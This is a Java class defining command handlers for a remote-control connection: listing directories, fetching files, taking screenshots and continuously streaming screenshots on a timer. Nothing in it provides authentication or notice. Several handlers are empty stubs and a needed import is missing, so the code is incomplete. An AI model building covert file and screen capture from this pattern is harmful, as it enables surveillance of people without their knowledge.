import java.util.*;
import java.io.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import org.json.JSONArray;
import java.util.Base64;

public class RemoteCommands {
    public static Map<String, BiConsumer<RemoteCT, String[]>> getBuiltinCommands() {
        Map<String, BiConsumer<RemoteCT, String[]>> commands = new HashMap<>();
        
        commands.put("Close", RemoteCommands::closeRemote);
        commands.put("sendPathList", RemoteCommands::sendPathList);
        commands.put("getPathList", RemoteCommands::getPathList);
        commands.put("sendFile", RemoteCommands::sendFile);
        commands.put("receiveFile", RemoteCommands::receiveFile);
        commands.put("getFile", RemoteCommands::getFile);
        commands.put("catchScreenshot", RemoteCommands::catchScreenshot);
        commands.put("sendScreenshot", RemoteCommands::sendScreenshot);
        commands.put("showScreenshot", RemoteCommands::showScreenshot);
        commands.put("getScreenshot", RemoteCommands::getScreenshot);
        commands.put("monitorRemoteScreen", RemoteCommands::monitorRemoteScreen);
        
        return commands;
    }

    public static void closeRemote(RemoteCT remote, String[] args) {
        remote.sendString("Close|1,");
        // Implementation for closing connection
    }

    public static void sendPathList(RemoteCT remote, String[] args) {
        File folder = new File(args[0]);
        String[] files = folder.list();
        JSONArray jsonArray = new JSONArray(Arrays.asList(files));
        remote.sendString(jsonArray.toString());
    }

    public static void getPathList(RemoteCT remote, String[] args) {
        remote.sendString("sendPathList|" + args[0] + ",");
        // Implementation for receiving path list
    }

    public static void sendFile(RemoteCT remote, String[] args) {
        // Implementation for sending file
    }

    public static void receiveFile(RemoteCT remote, String[] args) {
        // Implementation for receiving file
    }

    public static void getFile(RemoteCT remote, String[] args) {
        remote.sendString("sendFile|" + args[0] + ",");
    }

    public static void catchScreenshot(RemoteCT remote, String[] args) {
        try {
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage capture = new Robot().createScreenCapture(screenRect);
            ImageIO.write(capture, "png", new File("tmp_screenshot_" + args[0] + ".png"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void sendScreenshot(RemoteCT remote, String[] args) {
        remote.sendString("sendFile|tmp_screenshot_" + args[0] + ".png");
    }

    public static void showScreenshot(RemoteCT remote, String[] args) {
        // Implementation for showing screenshot
    }

    public static void getScreenshot(RemoteCT remote, String[] args) {
        remote.sendString("catchScreenshot|" + args[0]);
        remote.sendString("sendScreenshot|" + args[0]);
        if (args.length > 1 && args[1].equalsIgnoreCase("true")) {
            showScreenshot(remote, args);
        }
    }

    public static void monitorRemoteScreen(RemoteCT remote, String[] args) {
        int monitor = Integer.parseInt(args[0]);
        int interval = Integer.parseInt(args[1]);
        
        Thread monitorThread = new Thread(() -> {
            while (true) {
                remote.sendString("catchScreenshot|" + monitor);
                remote.sendString("sendScreenshot|" + monitor);
                try {
                    Thread.sleep(interval * 1000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        });
        monitorThread.start();
    }
}
